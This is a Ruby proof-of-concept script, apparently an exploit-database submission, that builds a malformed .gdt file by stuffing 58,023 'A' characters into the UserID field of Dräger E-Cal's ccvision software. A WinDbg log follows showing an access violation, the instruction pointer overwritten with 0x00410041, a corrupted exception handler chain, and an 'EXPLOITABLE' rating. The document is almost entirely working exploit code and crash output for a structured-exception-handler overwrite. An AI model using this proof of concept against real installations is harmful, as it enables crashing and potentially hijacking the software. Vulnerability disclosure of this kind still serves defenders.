#!/usr/bin/env ruby
# sample.gdt is attached.
# using USerID parameter.
# https://www.draeger.com/en-us_us/Products/E-Cal
data = 'A' * 58023

fd = File.open('sample.gdt', 'rb' )
new_gdt = fd.read(fd.stat.size)
fd.close

fuzz = new_gdt

x = File.new('poc.gdt','wb')
x.write(fuzz.gsub(/FUZZ/, data))
x.close
__END__
(1d20.f4c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000041 ebx=01eb54f6 ecx=00005585 edx=00009fed esi=7ffb001c edi=10f60485
eip=77a33254 esp=01eb53ac ebp=01eb53c4 iopl=0         nv up ei ng nz ac po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210293
ntdll!RtlMultiByteToUnicodeN+0x84:
77a33254 6689044b        mov     word ptr [ebx+ecx*2],ax  ds:002b:01ec0000=0020
0:000> g
(1d20.f4c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=00410041 edx=77a58dc0 esi=00000000 edi=00000000
eip=00410041 esp=01eb4df8 ebp=01eb4e18 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210246
ccvision+0x10041:
00410041 cdff            int     0FFh
0:000> !exchain
01eb485c: ntdll!ExecuteHandler2+44 (77a58dc0)
01eb4e0c: ntdll!ExecuteHandler2+44 (77a58dc0)
01eb5450: KERNEL32!_except_handler4+0 (76d93540)
  CRT scope  0, func:   KERNEL32!BaseDllReadWriteIniFileOnDisk+101ed (76d9fa3c)
01eb54e0: ccvision+28fdd9 (0068fdd9)
01ebf500: ccvision+10041 (00410041)
Invalid exception stack at 00410041
0:000> !exploitable

!exploitable 1.6.0.0
Exploitability Classification: EXPLOITABLE
Recommended Bug Title: Exploitable - Exception Handler Chain Corrupted starting at ccvision+0x0000000000010041 (Hash=0x1b74d5f1.0xa8cb82bb)

Corruption of the exception handler chain is considered exploitable

